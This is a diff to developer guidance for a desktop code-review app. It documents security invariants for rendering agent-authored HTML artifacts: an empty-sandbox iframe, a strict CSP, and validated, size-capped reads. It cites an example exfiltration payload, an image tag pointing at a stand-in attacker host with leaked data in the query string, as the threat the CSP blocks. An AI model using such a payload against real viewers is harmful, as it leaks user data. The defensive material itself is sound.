@@ -148,6 +148,28 @@ assumed — this skill is the codebase-specific layer beneath them.
   rendered," never as source of truth (the agent's own pushed set is still `get_feature_review`).
   *Verify:* the MCP tool list has only `get_feature_view` for it; the only writer is
   `writeFeatureSnapshot`; `rg -n "createServer|listen\(|http" src/mcp` still finds nothing.
+- **The feature artifact is agent-authored ACTIVE content — render it ONLY in a fully
+  sandboxed iframe.** The 9th channel (`~/.porcelain/artifacts.json`, `artifact-store.ts` ↔
+  `src/mcp/artifact-file.ts`, `set/get/clear_feature_artifact`, `Record<repoPath, { title, html,
+  updatedAt }>`) lets the agent author a self-contained HTML document that Porcelain renders in
+  the viewer. Unlike every other channel's content (inert text/paths), the `html` is executable
+  markup, so the safeguards that make it acceptable, all of which must hold: (1) it renders ONLY
+  inside `<iframe sandbox="" srcdoc={html}>` (`artifact-view.tsx`) — the EMPTY sandbox attribute:
+  no `allow-scripts`, no `allow-same-origin`, no `allow-popups`, ever. `sandbox=""` stops script
+  execution, same-origin access, and navigation; `srcdoc` keeps it a self-contained document. Never
+  add an `allow-*` token or swap to a `src` URL. (2) The parent CSP (`default-src 'self'; img-src
+  'self' data:` in `index.html`) is the ONLY thing blocking external subresource loads (a remote
+  `<img>`/stylesheet/font) — a `srcdoc` document inherits it, and sandbox alone does NOT block
+  passive loads. This makes the CSP the real backstop against an HTML-only exfil channel
+  (`<img src="https://attacker/?leak=...">`): never widen it (e.g. adding a remote host to
+  `img-src`) while artifacts can render. (3) Reads are zod-validated + size-capped on
+  EVERY read (`readArtifact` drops an entry whose html exceeds `MAX_HTML_BYTES` = 1.5 MB, and
+  never throws — one bad agent write can't break the viewer), because an external process owns the
+  file. Same two-way shape as review-sets: the MCP server authors it, the app makes exactly ONE
+  write — `clearArtifact` (user-initiated), an atomic tmp+rename delete-entry — and it has a
+  `review-watch` entry → the `artifact` event. Still stdio only, no network surface. *Verify:* the
+  iframe keeps `sandbox=""` with no allow-tokens; the CSP is unchanged; `rg -n "createServer|listen\(|http" src/mcp`
+  still finds nothing; the app's only write to `artifacts.json` is `clearArtifact`.
 - **The plugin installer is the ONLY non-git shell-out, and it takes no user input.**
   `installPlugin` (`src/main/plugin.ts`) spawns a login shell to run a FIXED command
   (`claude plugin marketplace add <app-derived dir> && claude plugin install …`) —
